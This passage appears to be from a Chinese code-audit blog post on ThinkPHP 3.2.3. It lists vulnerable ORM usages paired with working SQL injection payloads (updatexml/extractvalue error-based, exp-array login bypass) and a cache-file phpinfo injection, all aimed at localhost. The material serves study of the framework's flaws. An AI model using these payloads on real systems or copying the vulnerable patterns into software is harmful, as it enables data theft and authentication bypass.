+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>where后直接直接拼接会产生注入</span><br><span class="line">$data = M(<span class="string">'user'</span>)-&gt;where(<span class="string">"id="</span>.I(<span class="string">'id'</span>))-&gt;select();</span><br><span class="line"> </span><br><span class="line"><span class="number">2.</span> table表名函数可控产生注入</span><br><span class="line">M()-&gt;table(I(<span class="string">'biao'</span>))-&gt;where(<span class="string">'1=1'</span>)-&gt;select();  </span><br><span class="line">table ?biao=thinkphp_user where <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(extractvalue(<span class="number">1</span>, concat(<span class="number">0x7e</span>, (select @@version),<span class="number">0x7e</span>)))-- -a 表名必须存在。</span><br><span class="line"> </span><br><span class="line"><span class="number">3.</span> field函数可控产生注入</span><br><span class="line">M(<span class="string">'user'</span>)-&gt;field(I(<span class="string">'id'</span>))-&gt;where(<span class="string">'1=1'</span>)-&gt;select(); </span><br><span class="line"><span class="comment">//SELECT `id` FROM `thinkphp_user` WHERE ( 1=1 ) id可控导致注入</span></span><br><span class="line"> </span><br><span class="line"><span class="number">4.</span> field别名可控存在注入</span><br><span class="line">M(<span class="string">'user'</span>)-&gt;field(<span class="keyword">array</span>(<span class="string">'id'</span>,<span class="string">'username'</span>=&gt;I(<span class="string">'name'</span>)))-&gt;select(); </span><br><span class="line"><span class="comment">// SELECT `id`,`username` AS `uname` FROM `thinkphp_user` //别名 ?name=uname`a报错</span></span><br><span class="line"> </span><br><span class="line"><span class="number">5.</span>-&gt;(alias|join|union)\s*\((\$|\$_|I) 用正则查找 alias|join|union参数可控制</span><br><span class="line">M(<span class="string">'user'</span>)-&gt;field(I(<span class="string">'id'</span>))-&gt;union(<span class="string">'select 1 from thinkphp_user'</span>)-&gt;select();</span><br><span class="line"> </span><br><span class="line"><span class="number">6.</span>order,group,having参数可控</span><br><span class="line">M(<span class="string">'user'</span>)-&gt;where(<span class="string">'1=1'</span>)-&gt;order(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;I(<span class="string">'orderby'</span>)))-&gt;select();</span><br><span class="line"> SELECT * FROM `thinkphp_user` WHERE ( <span class="number">1</span>=<span class="number">1</span> ) ORDER BY `id` asc ---?orderby=asc</span><br><span class="line"> </span><br><span class="line"><span class="number">7.</span>comment注入</span><br><span class="line">M(<span class="string">'user'</span>)-&gt;comment(I(<span class="string">'comment'</span>))-&gt;where(<span class="string">'1=1'</span>)-&gt;select(); </span><br><span class="line">SELECT * FROM `thinkphp_user` WHERE ( <span class="number">1</span>=<span class="number">1</span> ) <span class="comment">/* 111111111 */</span> comment=<span class="number">111111111</span></span><br><span class="line"> </span><br><span class="line"><span class="number">8.</span>索引注入</span><br><span class="line">$Model-&gt;index(I(<span class="string">'user'</span>))-&gt;select();</span><br><span class="line"> </span><br><span class="line"><span class="number">9.</span>query,execute，聚合函数支持原生的sql语句 </span><br><span class="line">M(<span class="string">'user'</span>)-&gt;count(I(<span class="string">'par'</span>)); <span class="comment">//聚合函数 SELECT COUNT(*) AS tp_count FROM `thinkphp_user` LIMIT 1 ?par=*</span></span><br><span class="line"> </span><br><span class="line"><span class="number">10.</span>exp注入</span><br><span class="line">a.)</span><br><span class="line">$data = <span class="keyword">array</span>();</span><br><span class="line">$data[<span class="string">'user'</span>] = $_POST[<span class="string">'username'</span>]; </span><br><span class="line">$data[<span class="string">'pass'</span>] = md5($_POST[<span class="string">'password'</span>]);</span><br><span class="line">M(<span class="string">'user'</span>)-&gt;where($data)-&gt;find();</span><br><span class="line">payload: username[<span class="number">0</span>]=exp&amp;username[<span class="number">1</span>]=aa<span class="string">'or 1=1%23&amp;password=1</span></span><br><span class="line"><span class="string">b.)</span></span><br><span class="line"><span class="string">$res=M('</span>member<span class="string">')-&gt;where(array('</span>id<span class="string">'=&gt;$_GET['</span>userid<span class="string">']))-&gt;count();   </span></span><br><span class="line"><span class="string">payload:userid[0]=exp&amp;userid[1]=aaaaaa</span></span><br><span class="line"><span class="string">c.)通过I函数exp注入就不存在了</span></span><br><span class="line"><span class="string">$res = M('</span>member<span class="string">')-&gt;where(array('</span>id<span class="string">'=&gt;$I('</span>userid<span class="string">')))-&gt;count();</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">11、参数传递注入 public\s+function\s+[\w_]+\(\$</span></span><br><span class="line"><span class="string">public function index(/*$id*/)</span></span><br><span class="line"><span class="string">if(intval($id)&gt;0)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"> $data = M('</span>user<span class="string">')-&gt;where('</span>id=<span class="string">'.$id)-&gt;select(); //?id=1) 直接绕过判断</span></span><br><span class="line"><span class="string"> dump($data);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">12.setInc注入</span></span><br><span class="line"><span class="string">$user = M("user");</span></span><br><span class="line"><span class="string">$user-&gt;where('</span>id=<span class="number">5</span><span class="string">')-&gt;setInc('</span>sorce<span class="string">'.I('</span>num<span class="string">'));</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">13.组合注入</span></span><br><span class="line"><span class="string">$map['</span>id<span class="string">'] = I('</span>id<span class="string">');</span></span><br><span class="line"><span class="string">$map['</span>_string<span class="string">'] = '</span>username=<span class="string">'."'</span><span class="string">".I('username')."</span><span class="string">'"; </span></span><br><span class="line"><span class="string">$data = M('</span>user<span class="string">')-&gt;where($map)-&gt;select();</span></span><br><span class="line"><span class="string">dump(data);</span></span><br><span class="line"><span class="string">[url]http://127.0.0.1/tp/index.php/home/user/index?id=5&amp;username=afanti[/url] </span></span><br><span class="line"><span class="string">SELECT * FROM `thinkphp_user` WHERE `id` = 5 AND ( username='</span>afanti<span class="string">' )</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">14、_query参数可控</span></span><br><span class="line"><span class="string">$map['</span>id<span class="string">'] = 5;</span></span><br><span class="line"><span class="string">$map['</span>_query<span class="string">']='</span>username=afanti&amp;score=<span class="number">10</span><span class="string">'; </span></span><br><span class="line"><span class="string">$data = M('</span>user<span class="string">')-&gt;where($map)-&gt;select();</span></span><br><span class="line"><span class="string">dump(data);</span></span><br><span class="line"><span class="string">SELECT * FROM `thinkphp_user` WHERE `id` = 5 AND ( `username` = '</span>afanti<span class="string">' AND `score` = '</span><span class="number">10</span><span class="string">' )</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">15、模板问题</span></span><br><span class="line"><span class="string">$name = $_GET['</span>name<span class="string">'];</span></span><br><span class="line"><span class="string">$this-&gt;assign($name); </span></span><br><span class="line"><span class="string">$this-&gt;display('</span>index<span class="string">'); //'</span>TMPL_ENGINE_TYPE<span class="string">' =&gt; '</span>php<span class="string">'才有效，默认是Think</span></span><br><span class="line"><span class="string">[url]http://127.0.0.1/tp/index.php/home/user/index?name[/url][_content]=</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">16、在runtime/key.php</span></span><br><span class="line"><span class="string">S('</span>a<span class="string">',I('</span>id<span class="string">')); //http://127.0.0.1/tp/index.php/home/index/test?id=%0Aphpinfo%28%29//</span></span><br><span class="line"><span class="string">在Temp生成文件 生成的文件名字可到cmd5破解</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">F('</span>key<span class="string">','</span><span class="string">'); </span></span><br><span class="line"><span class="string">$this-&gt;display();</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">17.select、find、delete注入</span></span><br><span class="line"><span class="string">public function test()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">       $id = i('</span>id<span class="string">');</span></span><br><span class="line"><span class="string">       $res = M('</span>user<span class="string">')-&gt;find($id);</span></span><br><span class="line"><span class="string">       //$res = M('</span>user<span class="string">')-&gt;delete($id);</span></span><br><span class="line"><span class="string">       //$res = M('</span>user<span class="string">')-&gt;select($id);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">注入的payload:</span></span><br><span class="line"><span class="string">table：[url]http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[/url][table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span></span><br><span class="line"><span class="string">alias：[url]http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[/url][alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span></span><br><span class="line"><span class="string">where: [url]http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[/url][where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span></span><br><span class="line"><span class="string">delete方法注入payload:</span></span><br><span class="line"><span class="string">where: [url]http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[/url][where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span></span><br><span class="line"><span class="string">alias: [url]http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[/url][where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span></span><br><span class="line"><span class="string">table: [url]http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[/url][table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--&amp;id[where]=1</span></span><br></pre></td></tr></table></figure>
+
+<p>陆陆续续整理了两周，也算是整完了，都是一些简单的漏洞。主要是学习一些代码审计的思路和方法，工具的配置和审计流程。也了解了thinkphp框架的基本结构，后面准备复现一些相关的cve。</p>
+<p>参考链接：<a href="https://www.mrwu.red/web/2043.html" target="_blank" rel="noopener">https://www.mrwu.red/web/2043.html</a><br><a href="https://www.bilibili.com/video/BV1K4411X7aS?from=search&seid=5833038953068986991>" target="_blank" rel="noopener">视频连接</a><br><a href="https://www.bugbank.cn/api/tweet/59f4562b7933885a45820544/inner?token=0835e822abb00678cca5c467b80fda75" target="_blank" rel="noopener">Thinkphp 从漏洞挖掘到安全防御pdf</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <span>文章作者:</span><a href="/" title="访问 CyzCc 的个人博客">CyzCc</a><br>
+  <span>最后更新:</span>2020年05月05日 16:05:14<br>
+  <span>原始链接:</span><a href="/2020/05/05/ThinkPHP3.2.3/" title="[代码审计]ThinkPHP3.2.3">https://cyzcc.vip/2020/05/05/ThinkPHP3.2.3/</a><br>
+  <span>版权声明:</span>转载请注明出处！<br>  
+</div>
+
+      
+</div>
+	
+	
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持就是我的动力！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="CyzCc Thanks"/>
+        <p>Thanks</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        
+          <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------　　　　本文结束　<i class="fa fa-heart"></i>　感谢您的阅读　　　　-------------</div>
+    
+</div>
+
+        
+      </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i> PHP代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/29/CTF-WEB/" rel="next" title="HackPack&NPUCTF&安恒四月">
+                <i class="fa fa-chevron-left"></i> HackPack&NPUCTF&安恒四月
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/11/ctfshow36d/" rel="prev" title="CTFshow36D&&网鼎杯AreUSerialz">
+                CTFshow36D&&网鼎杯AreUSerialz <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.gif"
+                alt="CyzCc" />
+            
+              <p class="site-author-name" itemprop="name">CyzCc</p>
+              <p class="site-description motion-element" itemprop="description">卍~~黑玫瑰将再次绽放~~卐</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">58</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="1643277253@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://www.heibanke.com/lesson/crawler_ex00/" target="_blank" title="爬虫闯关">
+                      
+                        <i class="fa fa-fw fa-globe"></i>爬虫闯关</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://adworld.xctf.org.cn/" target="_blank" title="攻防世界">
+                      
+                        <i class="fa fa-fw fa-globe"></i>攻防世界</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://buuoj.cn/" target="_blank" title="BUUCTF">
+                      
+                        <i class="fa fa-fw fa-globe"></i>BUUCTF</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://ctf.bugku.com/" target="_blank" title="BUGKU">
+                      
+                        <i class="fa fa-fw fa-globe"></i>BUGKU</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://xss-quiz.int21h.jp/" target="_blank" title="XSS-challenges">
+                      
+                        <i class="fa fa-fw fa-globe"></i>XSS-challenges</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://ctf.hutc.xyz/" target="_blank" title="HUCTF">
+                      
+                        <i class="fa fa-fw fa-globe"></i>HUCTF</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://paper.seebug.org/" target="_blank" title="Paper">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Paper</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://hkyx.myhack58.com/" target="_blank" title="黑客闯关游戏">
+                      
+                        <i class="fa fa-fw fa-globe"></i>黑客闯关游戏</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.freebuf.com/" target="_blank" title="FreeBuf">
+                      
+                        <i class="fa fa-fw fa-globe"></i>FreeBuf</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-globe"></i>CSDN</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://wiki.0-sec.org/#/dashboard" target="_blank" title="Zero Security">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Zero Security</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          <div id="days"></div>
+<script>
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("10/30/2019 15:13:14");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#代码审计之Thinkphp3-2-3"><span class="nav-number">1.</span> <span class="nav-text">代码审计之Thinkphp3.2.3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MVC讲解"><span class="nav-number">2.</span> <span class="nav-text">MVC讲解</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#环境搭建"><span class="nav-number">3.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#框架基础"><span class="nav-number">4.</span> <span class="nav-text">框架基础</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入审计"><span class="nav-number">5.</span> <span class="nav-text">SQL注入审计</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#常规注入"><span class="nav-number">5.1.</span> <span class="nav-text">常规注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#where注入"><span class="nav-number">5.1.1.</span> <span class="nav-text">where注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#table注入"><span class="nav-number">5.1.2.</span> <span class="nav-text">table注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#field注入"><span class="nav-number">5.1.3.</span> <span class="nav-text">field注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#alias-union-join注入"><span class="nav-number">5.1.4.</span> <span class="nav-text">alias-union-join注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#order-group-having"><span class="nav-number">5.1.5.</span> <span class="nav-text">order-group-having</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#comment方法"><span class="nav-number">5.1.6.</span> <span class="nav-text">comment方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#query-execute-聚合方法"><span class="nav-number">5.1.7.</span> <span class="nav-text">query/execute/聚合方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP注入"><span class="nav-number">5.2.</span> <span class="nav-text">EXP注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Action参数绑定注入"><span class="nav-number">5.3.</span> <span class="nav-text">Action参数绑定注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#组合注入"><span class="nav-number">5.4.</span> <span class="nav-text">组合注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#其他漏洞审计"><span class="nav-number">6.</span> <span class="nav-text">其他漏洞审计</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#逻辑越权"><span class="nav-number">6.1.</span> <span class="nav-text">逻辑越权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#缓存漏洞"><span class="nav-number">6.2.</span> <span class="nav-text">缓存漏洞</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#修复方案"><span class="nav-number">7.</span> <span class="nav-text">修复方案</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">8.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cyzCc</span>
+
+ <!-- 
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">150.4k</span>
+  
+
+</div>
+
+-->
+
+
+
+
+
+
+<!-- 新增访客统计代码 -->
+<!--<div class="busuanzi-count">
+    <script async="" src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      访问用户： <span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 人
+    </span>
+    <div class="powered-by"></div>
+    <span class="site-uv">
+      <i class="fa fa-eye"></i>
+      访问次数： <span class="busuanzi-value" id="busuanzi_value_site_pv"></span> 次
+    </span>
+    <!-- 博客字数统计 -->
+    <span class="site-pv">
+      <i class="fa fa-pencil"></i>
+      博客全站共： <span class="post-count">150.4k</span> 字
+    </span>
+	  <a href="http://www.beian.miit.gov.cn" target="_blank" rel="noopener">蜀ICP备20017267号</a>
+</div>
+<!-- 新增访客统计代码 END-->
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
